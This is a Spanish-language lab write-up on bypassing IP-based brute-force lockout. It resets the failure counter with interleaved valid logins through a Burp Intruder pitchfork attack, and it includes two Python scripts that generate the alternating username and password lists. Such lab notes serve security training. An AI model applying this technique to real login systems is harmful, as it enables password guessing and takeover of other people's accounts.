# Protección rota: bloqueo por IP

Tags: #GestionAutenticacion #BurpSuite 

```bash 
En este lab se explotará una debilidad lógica en la protección contra fuerza bruta basada en IP. La aplicación bloquea temporalmente una IP tras tres intentos fallidos consecutivos, pero este contador se reinicia si se realiza un inicio de sesión válido antes de alcanzar el límite.

Se aprovecha esta lógica para realizar un ataque tipo pitchfork en Burp Intruder, alternando peticiones con un usuario y contraseñas correctas, con intentos de acceso al usuario objetivo usando contraseñas de un diccionario. Este patrón evita que el sistema bloquee tu IP y te permite forzar la contraseña del usuario sin interrupciones. Al identificar la contraseña correcta, se inicia sesión en la cuenta. 
```

```bash 
1. En 'Intruder' crear una política 'Resource pool' para que al momento de hacer el ataque pruebe de una en una siguiendo un orden 
	1. Dar clic en 'Create new resource pool'
	2. Colocar un nombre 
	3. Seleccionar 'Maximum concurrent requests' y colocar '1' 
	4. Iniciar el ataque para que se ejecute la política 
```

```python
#!/usr/bin/env python3 

for i in range(0, 200):
	if i % 3 == 0:
		print("omar")
	else:
		print("juan")


Notas:
	1. Crear un diccionario de los usuarios a probar donde el segundo usuario es al que se le buscará su password 
	2. Este diccionario se usará en el 'Intruder' de Burpsuite con ataque 'Pitchfork'
```

```python 
#!/usr/bin/env python3

with open("passwords") as f:
	lines = f.readlines()
	
i = 0

for line in lines:
	if i % 3 ==0:
		print("omar123")
	else:
		print(line.strip())      # Strip() quita el salto de linea 
	i += 1
	
	
Notas:
	1. Crear un diccionario de passwords probando la credencial válida para el primer usuario, seguida de dos aleatorias para el segundo usuario 
	2. Ya debe de existir un diccionario llamado 'passwords' para que este script funcione y cree uno nuevo 
	3. Este diccionario se usará en el 'Intruder' de Burpsuite con ataque 'Pitchfork'
```